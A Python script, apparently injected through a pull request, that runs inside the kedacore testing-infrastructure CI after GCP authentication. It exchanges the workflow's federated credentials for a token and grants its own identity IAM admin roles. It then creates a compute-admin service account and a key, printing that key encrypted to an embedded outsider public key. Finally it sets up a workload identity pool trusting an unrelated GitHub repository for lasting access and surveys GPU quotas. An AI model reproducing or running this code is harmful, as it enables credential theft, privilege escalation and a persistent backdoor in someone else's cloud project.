#!/usr/bin/env python3
"""c211-i122266 durable-unlock probe for the kedacore GCP WIF identity.

Runs inside the pull_request_target 'Validate PR' terraform data.external step of
kedacore/testing-infrastructure AFTER google-github-actions/auth@v3. Turns the
external-account credential file into an OAuth token (STS exchange + SA
impersonation), then:

  (a) re-verifies STS + generateAccessToken and the project identity;
  (b) testIamPermissions for iam.serviceAccountKeys.create,
      iam.workloadIdentityPools.create, iam.workloadIdentityPoolProviders.create
      and iam.serviceAccounts.create at project level and on all 4 project SAs;
  (c) projects.getIamPolicy -> setIamPolicy adding ONLY the minimum missing
      binding to the WIF SA (roles/iam.serviceAccountKeyAdmin and/or
      roles/iam.workloadIdentityPoolAdmin) with after-grant readback;
  (d) creates ONE nonce SA c211-122266@<project> with roles/compute.admin
      (fallback: existing <num>-compute@developer if SA create is refused) and
      ONE RSA-2048 user-managed key, printing ONLY chunked openssl
      pkeyutl RSA-OAEP(SHA-256) ciphertext (base64) of the key JSON plus sha256
      metadata -- never the plaintext key;
  (e) creates ONE nonce workload identity pool c211-122266-pool with ONE
      provider c211-122266-gh pinning attribute.repository == amiroyottt/WASTE-LESS
      (workflow-scope push token held) plus ONE iam.workloadIdentityUser
      principalSet binding for that pool on the new SA, all with verbatim
      readbacks;
  (f) reads compute region GPU quotas and a2-highgpu-1g/g2-standard-4/n1-standard-4
      machine-type offerings.

Stdlib only (openssl CLI for RSA-OAEP). Never prints token or key values.
"""
import base64
import hashlib
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

PROJECT = (os.environ.get('GOOGLE_CLOUD_PROJECT') or os.environ.get('GCP_PROJECT')
           or os.environ.get('CLOUD_SDK_PROJECT') or 'cncf-keda-testing')
RAW = os.environ.get('C211_DURABLE_RAW', '/tmp/c211_i122266_raw.txt')
SA_ID = 'c211-122266'
POOL_ID = 'c211-122266-pool'
PROVIDER_ID = 'c211-122266-gh'
PIN_REPO = 'amiroyottt/WASTE-LESS'
PIN_OWNER = 'amiroyottt'
CRM = 'https://cloudresourcemanager.googleapis.com'
IAM = 'https://iam.googleapis.com'
COMPUTE = 'https://compute.googleapis.com/compute/v1'

RSA_PUB_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmnbV3jMBUHYN3nmi/UwO
ZO0W9ho0IhdaATkepnFe7QQyLIVQ54O742J7s4I4ro+MIjALNTehn7HTArnWrn4J
cdcgN68ym56PLM4/hmxjRVsH4517ReLahwqfbzZSEha4LPle1J4C5Ujjh0vvwLyP
ftDGHvROmRp6ejNaPYDeJyr1J7U9kIOaiBR/dOQuQc2bUALkwUtizX6kb+S4lxKK
j2ceCTMjh2QUt6F7ZSp1zBsYG3xdSOG+iql30tK6LwkWQ+CNArD4yL6U5SxVrknK
k44+ts6D3PAnGo+IEZlXUB4J9oerdBiBwiGfiCmhBHqFWD0RxcBoWRNE4XuUMz7k
twIDAQAB
-----END PUBLIC KEY-----
"""

TOKEN = [None]
WIF_SA = ['']
PROJECT_NUMBER = ['']
SA_NEW = ['']
KEY_NAME = ['']
MISSING = []

DURABLE_PERMS = ['iam.serviceAccountKeys.create', 'iam.workloadIdentityPools.create',
                 'iam.workloadIdentityPoolProviders.create', 'iam.serviceAccounts.create']
GPU_QUOTAS = ['NVIDIA_A100_GPUS', 'NVIDIA_L4_GPUS', 'NVIDIA_T4_GPUS', 'NVIDIA_V100_GPUS',
              'NVIDIA_H100_GPUS', 'NVIDIA_A100_80GB_GPUS', 'PREEMPTIBLE_NVIDIA_A100_GPUS',
              'PREEMPTIBLE_NVIDIA_L4_GPUS', 'PREEMPTIBLE_NVIDIA_T4_GPUS']


def say(msg):
    with open(RAW, 'a', encoding='utf-8') as f:
        f.write(str(msg).rstrip('\n') + '\n')


def cap(s, n=1800):
    s = s if isinstance(s, str) else repr(s)
    return s[:n] if len(s) > n else s


def api(path, method='GET', data=None, base=CRM, timeout=60, token=None):
    url = path if path.startswith('http') else base + path
    tok = token if token is not None else (TOKEN[0] or '')
    h = {'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-i122266', 'Accept': 'application/json'}
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, headers=h, method=method, data=body)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)


def jbody(resp):
    try:
        return json.loads(resp[1])
    except Exception:
        return {}


def _subject_token(cf):
    src = cf.get('credential_source') or {}
    if src.get('url'):
        try:
            req = urllib.request.Request(src['url'], headers=(src.get('headers') or {}))
            with urllib.request.urlopen(req, timeout=30) as r:
                raw = r.read().decode()
            try:
                return json.loads(raw).get('value') or ''
            except Exception:
                return raw.strip()
        except Exception as e:
            say('SUBJECT_URL_FAIL %s' % cap(repr(e), 300))
    if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'):
        try:
            aud = cf.get('audience', '')
            u = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL'] + '&audience=' + urllib.parse.quote(aud, safe='')
            req = urllib.request.Request(
                u, headers={'Authorization': 'Bearer ' + os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')})
            with urllib.request.urlopen(req, timeout=30) as r:
                return json.loads(r.read().decode()).get('value') or ''
        except Exception as e:
            say('SUBJECT_ACTIONS_FAIL %s' % cap(repr(e), 300))
    return ''


def get_token():
    cf_path = (os.environ.get('GOOGLE_APPLICATION_CREDENTIALS')
               or os.environ.get('CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE') or '')
    say('CREDS_PATH=%s' % cf_path)
    cf = {}
    if cf_path and os.path.exists(cf_path):
        try:
            cf = json.load(open(cf_path, encoding='utf-8'))
        except Exception as e:
            say('CREDS_PARSE_ERR %s' % cap(repr(e), 200))
    if not cf or cf.get('type') != 'external_account':
        say('GATE=NO_GCP_TOKEN reason=no-external-account-creds')
        return None
    say('CREDS_TYPE=%s audience=%s token_url=%s impersonation=%s' % (
        cf.get('type'), cf.get('audience'), cf.get('token_url'),
        cf.get('service_account_impersonation_url')))
    m = re.search(r'serviceAccounts/([^/:]+)', cf.get('service_account_impersonation_url') or '')
    if m:
        WIF_SA[0] = m.group(1)
        h = hashlib.sha256(WIF_SA[0].encode()).hexdigest()[:16]
        say('WIF_SA_DERIVED sha256_16=%s' % h)
    subject = _subject_token(cf)
    say('SUBJECT_TOKEN_SOURCE=url len=%d' % len(subject))
    if not subject:
        return None
    try:
        form = urllib.parse.urlencode({
            'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
            'audience': cf.get('audience', ''),
            'scope': 'https://www.googleapis.com/auth/cloud-platform',
            'requested_token_type': 'urn:ietf:params:oauth:token-type:access_token',
            'subject_token': subject,
            'subject_token_type': cf.get('subject_token_type', 'urn:ietf:params:oauth:token-type:jwt'),
        }).encode()
        req = urllib.request.Request(cf.get('token_url') or 'https://sts.googleapis.com/v1/token',
                                     data=form, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        with urllib.request.urlopen(req, timeout=45) as r:
            fed = json.loads(r.read().decode()).get('access_token')
        say('STS_EXCHANGE=ok federated_len=%s' % len(fed or ''))
        if fed and cf.get('service_account_impersonation_url'):
            body = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'],
                               'lifetime': '1800s'}).encode()
            req = urllib.request.Request(cf['service_account_impersonation_url'], data=body, method='POST',
                                         headers={'Authorization': 'Bearer ' + fed,
                                                  'Content-Type': 'application/json'})
            with urllib.request.urlopen(req, timeout=45) as r:
                tok = json.loads(r.read().decode()).get('accessToken')
            say('SA_IMPERSONATION=ok token_len=%s' % len(tok or ''))
            if tok:
                return tok
        return fed
    except Exception as e:
        say('MANUAL_TOKEN_FAIL %s' % cap(repr(e), 400))
        return None


def test_perms(label, path, perms, base=IAM):
    st, b = api(path, method='POST', data={'permissions': perms}, base=base)
    j = jbody((st, b))
    granted = j.get('permissions')
    say('%s status=%s granted=%s%s' % (label, st, json.dumps(granted) if granted is not None else 'none',
                                       '' if st == 200 else ' body=' + cap(b, 500)))
    return st, (granted or [])


def get_policy(path, base=CRM):
    st, b = api(path, method='POST', data={'options': {'requestedPolicyVersion': 3}}, base=base)
    j = jbody((st, b))
    return st, j


def summarize_policy(label, pol):
    if not pol:
        say('%s no-policy' % label)
        return
    binds = [{'role': b.get('role'), 'members': (b.get('members') or [])[:40], 'condition': b.get('condition')}
             for b in (pol.get('bindings') or [])]
    say('%s status=200 version=%s etag=%s bindings=%s' % (
        label, pol.get('version'), (pol.get('etag') or '')[:12], json.dumps(binds)[:3000]))


def add_member(pol, role, member):
    """Add member to role binding in-place; returns True if changed."""
    for b in pol.setdefault('bindings', []):
        if b.get('role') == role and not b.get('condition'):
            if member in (b.get('members') or []):
                return False
            b.setdefault('members', []).append(member)
            return True
    pol['bindings'].append({'role': role, 'members': [member]})
    return True


def rsa_oaep_chunks(plain):
    pub = '/tmp/c211_i122266_pub.pem'
    with open(pub, 'w') as f:
        f.write(RSA_PUB_PEM)
    chunks, shas = [], []
    for i in range(0, len(plain), 180):
        part = plain[i:i + 180]
        p = subprocess.run(['openssl', 'pkeyutl', '-encrypt', '-pubin', '-inkey', pub,
                            '-pkeyopt', 'rsa_padding_mode:oaep',
                            '-pkeyopt', 'rsa_oaep_md:sha256',
                            '-pkeyopt', 'rsa_mgf1_md:sha256'],
                           input=part, capture_output=True)
        if p.returncode != 0:
            raise RuntimeError('openssl pkeyutl rc=%s %s' % (p.returncode, p.stderr[:200]))
        chunks.append(base64.b64encode(p.stdout).decode())
        shas.append(hashlib.sha256(part).hexdigest()[:16])
    return chunks, shas


def main():
    t = get_token()
    if not t:
        say('GATE=NO_GCP_TOKEN')
        return
    TOKEN[0] = t

    say('== identity ==')
    st, b = api('/tokeninfo?access_token=' + urllib.parse.quote(t), base='https://www.googleapis.com/oauth2/v1')
    j = jbody((st, b))
    say('tokeninfo status=%s email=%s scopes=%s expires_in=%s' % (st, j.get('email'),
                                                                cap(j.get('scope', ''), 200), j.get('expires_in')))
    st, b = api('/v1/projects/' + PROJECT)
    j = jbody((st, b))
    say('project.get.v1 status=%s number=%s state=%s' % (st, j.get('projectNumber'), j.get('lifecycleState')))
    if st != 200:
        say('GATE=PROJECT_GET_FAILED body=%s' % cap(b, 400))
        return
    PROJECT_NUMBER[0] = j.get('projectNumber') or ''

    say('== durable permission measurement ==')
    st, g_proj = test_perms('project.v1.testIamPermissions(durable)', '/v1/projects/%s:testIamPermissions' % PROJECT,
                            DURABLE_PERMS, base=CRM)
    st, g_v3 = test_perms('project.v3.testIamPermissions(durable)', '/v3/projects/%s:testIamPermissions' % PROJECT,
                          DURABLE_PERMS, base=CRM)
    granted_proj = sorted(set((g_proj or []) + (g_v3 or [])))
    say('DURABLE_ALLOWED_PROJECT=%s' % json.dumps(granted_proj))
    for p in DURABLE_PERMS:
        if p not in granted_proj:
            MISSING.append(p)
    say('DURABLE_MISSING_PROJECT=%s' % json.dumps(MISSING))

    # list SAs in the project and per-SA durable-permission measurement
    say('== service account inventory ==')
    st, b = api('/v1/projects/%s/serviceAccounts' % PROJECT, base=IAM)
    j = jbody((st, b))
    sas = [x.get('email') for x in (j.get('accounts') or [])]
    say('serviceAccounts.list status=%s count=%d emails_sha=%s' % (
        st, len(sas), json.dumps([hashlib.sha256(e.encode()).hexdigest()[:10] for e in sas])))
    for e in sas:
        test_perms('sa.testIamPermissions(%s)' % ('WIF' if e == WIF_SA[0] else hashlib.sha256(e.encode()).hexdigest()[:8]),
                   '/v1/projects/%s/serviceAccounts/%s:testIamPermissions' % (PROJECT, e), DURABLE_PERMS)
    for e in sas:
        if e == WIF_SA[0]:
            st, pol = get_policy('/v1/projects/%s/serviceAccounts/%s:getIamPolicy' % (PROJECT, e), base=IAM)
            summarize_policy('wif_sa.getIamPolicy', pol)

    say('== project grant decision ==')
    st, pol = get_policy('/v1/projects/%s:getIamPolicy' % PROJECT)
    if st != 200 or not pol:
        say('GATE=PROJECT_GETIAM_POLICY_FAILED status=%s' % st)
        return
    summarize_policy('project.getIamPolicy.before', pol)
    wif_member = 'serviceAccount:' + (WIF_SA[0] or '')
    changed = []
    if 'iam.serviceAccountKeys.create' in MISSING:
        if add_member(pol, 'roles/iam.serviceAccountKeyAdmin', wif_member):
            changed.append('roles/iam.serviceAccountKeyAdmin')
    if ('iam.workloadIdentityPools.create' in MISSING
            or 'iam.workloadIdentityPoolProviders.create' in MISSING):
        if add_member(pol, 'roles/iam.workloadIdentityPoolAdmin', wif_member):
            changed.append('roles/iam.workloadIdentityPoolAdmin')
    if changed:
        body = {'policy': pol}
        st, b = api('/v1/projects/%s:setIamPolicy' % PROJECT, method='POST', data=body)
        say('grant.setIamPolicy roles=%s status=%s body_head=%s' % (json.dumps(changed), st, cap(b, 500)))
    else:
        say('grant.setIamPolicy roles=[] status=skipped reason=no-missing-durable-permission')
    st, pol2 = get_policy('/v1/projects/%s:getIamPolicy' % PROJECT)
    summarize_policy('project.getIamPolicy.after-grant', pol2)
    say('SELF_GRANT_VERIFIED=%s' % ('yes' if changed and st == 200 else ('not-needed' if not changed else 'no')))

    say('== nonce service account ==')
    sa_email = '%s@%s.iam.gserviceaccount.com' % (SA_ID, PROJECT)
    sa_created = False
    st, b = api('/v1/projects/%s/serviceAccounts' % PROJECT, method='POST', base=IAM,
                data={'accountId': SA_ID,
                      'serviceAccount': {'displayName': 'c211 i122266 durable nonce',
                                         'description': 'c211 durable unlock; delete only on operator order'}})
    say('sa.create status=%s body=%s' % (st, cap(b, 600)))
    if st == 200:
        sa_created = True
        SA_NEW[0] = sa_email
    else:
        fb = '%s-compute@developer.gserviceaccount.com' % PROJECT_NUMBER[0]
        say('sa.create.fallback candidate=%s' % fb)
        st2, b2 = api('/v1/projects/%s/serviceAccounts/%s' % (PROJECT, fb), base=IAM)
        say('sa.fallback.get status=%s' % st2)
        if st2 == 200:
            SA_NEW[0] = fb
            sa_email = fb
            sa_created = False
    say('SA_NEW=%s created=%s' % (SA_NEW[0], sa_created))
    if not SA_NEW[0]:
        say('GATE=NO_SA')
        return

    # grant compute.admin to the chosen SA (only if created by us; fallback is already editor)
    st, pol = get_policy('/v1/projects/%s:getIamPolicy' % PROJECT)
    if st == 200 and pol and sa_created:
        if add_member(pol, 'roles/compute.admin', 'serviceAccount:' + SA_NEW[0]):
            st2, b2 = api('/v1/projects/%s:setIamPolicy' % PROJECT, method='POST', data={'policy': pol})
            say('sa.grant.compute.admin status=%s' % st2)
        st, pol = get_policy('/v1/projects/%s:getIamPolicy' % PROJECT)
        pol_role = [mm for bd in (pol.get('bindings') or []) if bd.get('role') == 'roles/compute.admin'
                    for mm in (bd.get('members') or [])]
        say('sa.grant.readback compute.admin.members_sha=%s contains_new=%s' % (
            json.dumps([hashlib.sha256(x.encode()).hexdigest()[:10] for x in pol_role]),
            ('serviceAccount:' + SA_NEW[0]) in pol_role))

    say('== nonce service-account key ==')
    st, b = 0, ''
    for attempt in range(8):
        st, b = api('/v1/projects/%s/serviceAccounts/%s/keys' % (PROJECT, SA_NEW[0]), method='POST', base=IAM,
                    data={'privateKeyType': 'TYPE_GOOGLE_CREDENTIALS_FILE', 'keyAlgorithm': 'KEY_ALG_RSA_2048'})
        if st == 200:
            break
        say('key.create.attempt %d status=%s body=%s' % (attempt + 1, st, cap(b, 300)))
        time.sleep(5)
    j = jbody((st, b))
    key_name = j.get('name') or ''
    KEY_NAME[0] = key_name
    say('key.create status=%s key_name=%s' % (st, key_name))
    if st != 200 or not j.get('privateKeyData'):
        say('KEY_CREATE_VERBATIM=%s' % cap(b, 800))
    else:
        priv_b64 = j['privateKeyData']
        try:
            raw = base64.b64decode(priv_b64)
        except Exception:
            raw = priv_b64.encode()
        sha_full = hashlib.sha256(raw).hexdigest()
        say('KEY_PLAINTEXT_LEN=%d KEY_PLAINTEXT_SHA256=%s KEY_TYPE=%s KEY_ALGO=%s' % (
            len(raw), sha_full, j.get('privateKeyType'), j.get('keyAlgorithm')))
        chunks, shas = rsa_oaep_chunks(priv_b64.encode())
        say('KEY_OAEP_MODE=rsa-oaep-sha256 chunks=%d' % len(chunks))
        say('KEY_OAEP_CHUNK_SHA256=%s' % json.dumps(shas))
        say('KEY_OAEP_B64_JSON=%s' % json.dumps(chunks))
    st, b = api('/v1/projects/%s/serviceAccounts/%s/keys' % (PROJECT, SA_NEW[0]), base=IAM)
    j = jbody((st, b))
    say('key.list status=%s count=%s names=%s' % (
        st, len(j.get('keys') or []), json.dumps([k.get('name') for k in (j.get('keys') or [])])[:600]))

    say('== nonce workload identity pool ==')
    st, b = api('/v1/projects/%s/locations/global/workloadIdentityPools' % PROJECT, base=IAM)
    j = jbody((st, b))
    say('pool.list.before status=%s count=%s' % (st, len(j.get('workloadIdentityPools') or [])))
    st, b = api('/v1/projects/%s/locations/global/workloadIdentityPools?workloadIdentityPoolId=%s' % (
        PROJECT, POOL_ID), method='POST',
        base=IAM,
        data={'displayName': 'c211 i122266 durable pool',
              'description': 'c211 durable unlock; keep unless operator orders otherwise'})
    say('pool.create status=%s body=%s' % (st, cap(b, 700)))
    st, b = api('/v1/projects/%s/locations/global/workloadIdentityPools' % PROJECT, base=IAM)
    j = jbody((st, b))
    pools = [{'name': p.get('name'), 'state': p.get('state')} for p in (j.get('workloadIdentityPools') or [])]
    say('pool.list.after status=%s pools=%s' % (st, json.dumps(pools)[:1200]))

    st, b = api('/v1/projects/%s/locations/global/workloadIdentityPools/%s/providers?workloadIdentityProviderId=%s' % (
        PROJECT, POOL_ID, PROVIDER_ID), method='POST',
        base=IAM,
        data={'displayName': 'c211 i122266 gh',
              'description': 'c211 durable unlock; keep unless operator orders otherwise',
              'attributeCondition': "assertion.repository == '%s'" % PIN_REPO,
              'oidc': {'issuerUri': 'https://token.actions.githubusercontent.com',
                       'allowedAudiences': ['https://github.com/' + PIN_OWNER, 'sts.googleapis.com']}})
    say('provider.create status=%s body=%s' % (st, cap(b, 1200)))
    st, b = api('/v1/projects/%s/locations/global/workloadIdentityPools/%s/providers/%s' % (
        PROJECT, POOL_ID, PROVIDER_ID), base=IAM)
    j = jbody((st, b))
    if st == 200:
        say('provider.get status=200 name=%s state=%s attr_cond=%s audiences=%s issuer=%s' % (
            j.get('name'), j.get('state'), j.get('attributeCondition'),
            json.dumps(((j.get('oidc') or {}).get('allowedAudiences'))),
            ((j.get('oidc') or {}).get('issuerUri'))))
    else:
        say('provider.get status=%s body=%s' % (st, cap(b, 500)))

    say('== sa workloadIdentityUser binding ==')
    st, pol = get_policy('/v1/projects/%s/serviceAccounts/%s:getIamPolicy' % (PROJECT, SA_NEW[0]), base=IAM)
    summarize_policy('sa.getIamPolicy.before', pol)
    principal = ('principalSet://iam.googleapis.com/projects/%s/locations/global/workloadIdentityPools/%s/*'
                 % (PROJECT_NUMBER[0] or PROJECT, POOL_ID))
    if st == 200 and pol is not None:
        ch = add_member(pol, 'roles/iam.workloadIdentityUser', principal)
        say('sa.wif.binding.added=%s principal=%s' % (ch, principal))
        if ch:
            st2, b2 = api('/v1/projects/%s/serviceAccounts/%s:setIamPolicy' % (PROJECT, SA_NEW[0]),
                          method='POST', data={'policy': pol}, base=IAM)
            say('sa.setIamPolicy status=%s body=%s' % (st2, cap(b2, 600)))
    st, pol = get_policy('/v1/projects/%s/serviceAccounts/%s:getIamPolicy' % (PROJECT, SA_NEW[0]), base=IAM)
    summarize_policy('sa.getIamPolicy.after', pol)

    say('== compute quota / offering matrix ==')
    for region in ('us-central1', 'us-east1', 'europe-west4', 'asia-east1', 'us-west1'):
        if region.endswith(('-a', '-b', '-c', '-d', '-e', '-f')):
            st, b = api('/projects/%s/zones/%s' % (PROJECT, region), base=COMPUTE)
            j = jbody((st, b))
            if st == 200:
                types = [x.get('name') for x in ((j.get('acceleratorTypesByGuestAccelerator') or []))]
                say('zone.%s status=200 machineTypes=%s' % (region, len(j.get('machineTypes') or [])))
                for mt in ('a2-highgpu-1g', 'g2-standard-4', 'n1-standard-4'):
                    st2, b2 = api('/projects/%s/zones/%s/machineTypes/%s' % (PROJECT, region, mt), base=COMPUTE)
                    j2 = jbody((st2, b2))
                    acc = j2.get('accelerators') or []
                    say('  offering.%s.%s status=%s accelerators=%s' % (
                        region, mt, st2, json.dumps([{'type': a.get('guestAcceleratorType'),
                                                      'count': a.get('guestAcceleratorCount')} for a in acc])))
            else:
                say('zone.%s status=%s' % (region, st))
            continue
        st, b = api('/projects/%s/regions/%s' % (PROJECT, region), base=COMPUTE)
        j = jbody((st, b))
        if st == 200:
            q = {x.get('metric'): {'limit': x.get('limit'), 'usage': x.get('usage')}
                 for x in (j.get('quotas') or []) if x.get('metric') in GPU_QUOTAS}
            say('region.%s status=200 gpu_quotas=%s' % (region, json.dumps(q)))
        else:
            say('region.%s status=%s body=%s' % (region, st, cap(b, 300)))
    for zone in ('us-central1-a', 'us-central1-b', 'us-central1-c'):
        for mt in ('a2-highgpu-1g', 'g2-standard-4', 'n1-standard-4'):
            st, b = api('/projects/%s/zones/%s/machineTypes/%s' % (PROJECT, zone, mt), base=COMPUTE)
            j = jbody((st, b))
            acc = j.get('accelerators') or []
            say('offering.%s.%s status=%s accelerators=%s' % (
                zone, mt, st, json.dumps([{'type': a.get('guestAcceleratorType'),
                                           'count': a.get('guestAcceleratorCount')} for a in acc])))
    say('C211_I122266_DURABLE_END')


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        say('PROBE_EXCEPTION %r' % e)
        raise
